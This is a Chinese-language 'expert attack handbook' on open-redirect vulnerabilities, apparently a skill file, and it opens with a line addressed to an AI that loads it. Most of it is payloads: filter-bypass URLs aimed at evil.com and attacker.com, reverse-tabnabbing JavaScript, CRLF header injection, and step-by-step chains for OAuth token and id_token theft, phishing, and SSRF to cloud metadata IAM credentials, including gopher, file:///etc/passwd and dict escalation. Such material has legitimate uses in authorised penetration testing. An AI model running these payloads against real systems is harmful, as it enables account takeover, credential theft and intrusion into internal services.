# 技能：开放重定向 — 专家攻击手册

> **AI 加载指令**：开放重定向技术。涵盖基于参数的重定向、JavaScript 污点、过滤绕过，以及与网络钓鱼、CSRF Referer 绕过、OAuth 令牌窃取和 SSRF 链接。通常被低估但对于网络钓鱼至关重要，也是多步骤攻击链中的基础构建模块。

## 1. 核心概念

开放重定向发生在应用程序将用户重定向到从用户输入派生的 URL 而未进行验证时。受信任的域名充当网络钓鱼或令牌窃取的“发射平台”。

```
https://trusted.com/redirect?url=https://evil.com
→ 用户在链接中看到 trusted.com → 点击 → 落地于 evil.com
```

---

## 2. 查找重定向参数

### 常见参数名称

```text
?url=           ?redirect=      ?next=          ?dest=
?destination=   ?redir=         ?return=        ?returnUrl=
?go=            ?forward=       ?target=        ?out=
?continue=      ?link=          ?view=          ?to=
?ref=           ?callback=      ?path=          ?rurl=
```

### 服务器端污点

```
HTTP 301/302 Location 头部
PHP: header("Location: $input")
Python: redirect(input)
Java: response.sendRedirect(input)
Node: res.redirect(input)
```

### 客户端（JavaScript）污点

```javascript
window.location = input
window.location.href = input
window.location.replace(input)
window.open(input)
document.location = input
```

---

## 3. 过滤绕过技术

| 验证 | 绕过 |
|---|---|
| 检查 URL 是否以 `/` 开头 | `//evil.com`（协议相对路径） |
| 检查域名包含 `trusted.com` | `evil.com?trusted.com` 或 `trusted.com.evil.com` |
| 阻止 `http://` | `//evil.com`, `https://evil.com`, `\/\/evil.com` |
| 检查 URL 是否以 `https://trusted.com` 开头 | `https://trusted.com@evil.com`（用户信息） |
| 正则表达式 `^/[^/]`（仅相对路径） | `/\evil.com`（在某些浏览器中反斜杠被视为路径） |
| Django `endswith('target.com')` | `http://evil.com/www.target.com` — URL 路径以目标域名结束 |
| 域名后缀白名单 | `*.trusted.com` 的子域名接管 |

```text
# 协议相对路径：
//evil.com

# 用户信息绕过：
https://trusted.com@evil.com

# 反斜杠技巧：
/\evil.com
/\/evil.com

# URL 编码：
https://trusted.com/%2F%2Fevil.com

# Django endswith 绕过：
http://evil.com/www.target.com
http://evil.com?target.com

# 受信任站点双重重定向（例如，通过百度链接服务）：
https://link.target.com/?url=http://evil.com

# 特殊字符混淆：
http://evil.com#@trusted.com        # 片段作为授权
http://evil.com?trusted.com         # 查询字符串混淆
http://trusted.com%00@evil.com      # 空字节截断

# URL 中的 Tab/换行（浏览器忽略空白）：
java%09script:alert(1)
```

---

## 4. 利用链

### 网络钓鱼放大

攻击者发送：`https://bigbank.com/redirect?url=https://bigbank-login.evil.com`
受害者看到 `bigbank.com` → 点击 → 在克隆站点上输入凭证。

### OAuth 令牌窃取

如果 OAuth `redirect_uri` 在授权域上允许开放重定向：

```
/authorize?redirect_uri=https://trusted.com/redirect?url=https://evil.com
→ 授权码或令牌附加到 evil.com URL
→ 攻击者从 URL 片段或查询中捕获令牌
```

### CSRF Referer 绕过

某些 CSRF 防护检查 `Referer` 头部是否包含受信任域：

```
1. 攻击者页面链接到：https://trusted.com/redirect?url=https://trusted.com/change-email
2. 重定向保留来自 trusted.com 的 Referer
3. CSRF 防护通过，因为 Referer = trusted.com
```

### 通过重定向的 SSRF

当服务器遵循重定向时：

```
?url=https://attacker.com/redirect-to-internal
# attacker.com 返回 302 → http://169.254.169.254/
# 服务器遵循重定向 → SSRF 到元数据端点
```

---

## 5. 测试清单

```
□ 识别所有触发重定向的 URL 参数
□ 测试外部域名：?url=https://evil.com
□ 测试协议相对路径：?url=//evil.com
□ 测试用户信息绕过：?url=https://trusted.com@evil.com
□ 测试反斜杠：?url=/\evil.com
□ 测试 JavaScript 污点：?url=javascript:alert(1) (基于 DOM)
□ 检查 OAuth 流程中的 redirect_uri 开放重定向
□ 验证重定向是否在 URL 中保留认证令牌
```

---

## 6. Tab 抢占（反向 Tab 抢占）

### 概念

当链接在新标签页中打开 `target="_blank"` 但没有 `rel="noopener"` 时：

- 新页面可以访问 `window.opener`
- 它可以重定向原始页面：`window.opener.location = "https://phishing.com/login"`
- 用户返回到“原始”标签页 → 看到假登录页面 → 输入凭证

### 检测

```html
<!-- 易受攻击的： -->
<a href="https://external.com" target="_blank">点击这里</a>

<!-- 安全的： -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">点击这里</a>
```

### 利用

```javascript
// 在攻击者控制的页面（通过 target="_blank" 打开）：
if (window.opener) {
    window.opener.location = "https://phishing.com/fake-login.html";
}
```

### 查找位置

- 用户生成的内容中的链接（论坛、评论、个人资料）
- `target="_blank"` 链接到外部域名
- PDF 查看器、文档预览在新标签页中打开

---

## 7. 开放重定向 → OAuth 令牌窃取（详细链）

### 7.1 OAuth 隐式流程

在隐式流程中，访问令牌返回在 URL 片段 (`#access_token=...`) 中。如果 `redirect_uri` 在授权域上允许开放重定向：

```text
/authorize?response_type=token
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback/../redirect?url=https://evil.com
  &scope=read

流程：
1. 用户认证 → 授权服务器重定向到：
   https://target.com/redirect?url=https://evil.com#access_token=SECRET
2. 开放重定向触发 → 浏览器导航到：
   https://evil.com#access_token=SECRET
3. 攻击者页面读取 location.hash → 捕获访问令牌
```

### 7.2 授权码流程

授权码作为查询参数发送。如果重定向链保留查询参数：

```text
/authorize?response_type=code
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback%2f..%2fredirect%3furl%3dhttps://evil.com

流程：
1. 授权服务器验证 redirect_uri 前缀 → 匹配 https://target.com/
2. 重定向到：https://target.com/redirect?url=https://evil.com&code=AUTH_CODE
3. 开放重定向将受害者发送到：https://evil.com?code=AUTH_CODE
4. 攻击者用代码交换访问令牌
```

### 7.3 OIDC id_token 片段泄露

```text
/authorize?response_type=id_token
  &client_id=CLIENT
  &redirect_uri=https://target.com/cb
  &nonce=NONCE

如果 redirect_uri 指向开放重定向端点：
→ id_token 在片段中发送给攻击者
→ 攻击者拥有已签名的身份断言
→ 可以在接收此 IdP 的任何 RP 上冒充受害者
```

### 7.4 redirect_uri 验证绕过模式

```text
redirect_uri=https://target.com/callback/../open-redirect?url=evil.com
redirect_uri=https://target.com/callback?next=https://evil.com
redirect_uri=https://target.com/callback%23@evil.com
redirect_uri=https://target.com/callback/../../redirect
redirect_uri=https://target.com/callback#@evil.com
```

---

## 8. 开放重定向 → SSRF 链

### 服务器端重定向跟随

当服务器端组件跟随 HTTP 重定向（例如，URL 预览、链接展开器、webhook、图像获取器）：

```text
1. 提交 URL 到服务器端获取器：http://attacker.com/redirect
2. attacker.com 响应：302 Location: http://169.254.169.254/latest/meta-data/
3. 服务器跟随重定向 → SSRF 到云元数据端点
4. 响应（IAM 凭证）返回给攻击者或在预览中可见
```

### 多跳重定向用于过滤绕过

```text
1. 服务器阻止直接请求到 169.254.169.254
2. 提交：http://attacker.com/r1
3. r1 → 302 → http://attacker.com/r2  (相同域，通过过滤器)
4. r2 → 302 → http://169.254.169.254/ (内部，过滤器未重新检查)
```

### DNS 反绑定变体

```text
1. attacker.com 解析为攻击者的公网 IP (TTL=0)
2. 服务器解析 attacker.com → 公网 IP → 通过 SSRF 过滤器
3. 连接建立，但 HTTP 重定向指向 attacker.com 再次
4. 第二次 DNS 解析：attacker.com 现在解析为 169.254.169.254
5. 服务器跟随重定向到内部地址
```

### 通过重定向协议的范围提升

```text
http://attacker.com/redirect → gopher://127.0.0.1:6379/...  (Redis SSRF)
http://attacker.com/redirect → file:///etc/passwd            (本地文件读取)
http://attacker.com/redirect → dict://127.0.0.1:11211/       (Memcached)
```

并非所有 HTTP 客户端都遵循跨协议重定向，但 `curl`（默认）和一些库会。

---

## 9. URL 解析器混淆用于重定向绕过

当重定向验证函数解析 URL 的方式与最终处理它的浏览器或服务器不同时：

### 协议相对 URL

```text
//attacker.com
→ 浏览器：https://attacker.com（继承当前页面的协议）
→ 某些验证器：相对路径 "/attacker.com"（错误）
```

### 反斜杠混淆

```text
\/\/attacker.com
/\/attacker.com
→ 许多浏览器在 URL 中将 \ 规范化为 /
→ 将 \ 视为路径字符的验证器可能允许它
```

### 用户信息部分滥用

```text
//attacker.com\@target.com
→ 浏览器：导航到 attacker.com (@ 是用户信息分隔符)
→ 验证器在字符串中看到 "target.com" → 通过白名单检查

//target.com@attacker.com
→ 浏览器：用户信息=target.com，主机=attacker.com
→ 验证器检查“以 target.com 开头” → 通过

https://target.com%2F@attacker.com
→ URL 解码：target.com/ 作为用户信息，主机=attacker.com
```

### 双重编码

```text
//attacker%252ecom
→ 第一次解码：//attacker%2ecom（通过验证器）
→ 第二次解码（由服务器/浏览器）：//attacker.com（实际重定向）
```

### CRLF 注入 + 重定向

```text
/%0d%0aLocation:%20https://attacker.com
→ 如果服务器在头部上下文中反射路径：
   HTTP/1.1 302 Found
   Location: /
   Location: https://attacker.com  ← 注入的头部获胜
```

### 片段混淆

```text
https://target.com#@attacker.com
→ 浏览器：主机=target.com，片段=@attacker.com
→ 但某些基于 JS 的重定向：window.location = url → 可能处理不同

https://attacker.com#.target.com
→ 验证器：在字符串中看到 "target.com" → 通过
→ 浏览器：导航到 attacker.com（片段在导航中忽略）
```

### 特殊字符

```text
https://attacker.com%E3%80%82target.com
→ Unicode 表意文字全角点（U+3002）— 某些解析器将其视为点
→ 浏览器可能规范化不同

https://attacker。com    (U+3002 全角点)
https://attacker．com    (U+FF0E 全角全点)
```

### 综合 URL 解析器差异表

| Payload | Validator Sees | Browser Navigates To |
|---------|---------------|---------------------|
| `//evil.com` | 相对路径 | `https://evil.com` |
| `\/\/evil.com` | 路径 `\/\/evil.com` | `https://evil.com` |
| `//evil.com\@target.com` | 包含 `target.com` | `https://evil.com` |
| `//target.com@evil.com` | 以 `target.com` 开头 | `https://evil.com` |
| `/%0d%0aLocation: https://evil.com` | 路径字符串 | 头部注入 → 重定向 |
| `//evil%252ecom` | `evil%2ecom`（不是域名） | `evil.com`（在二次解码后） |
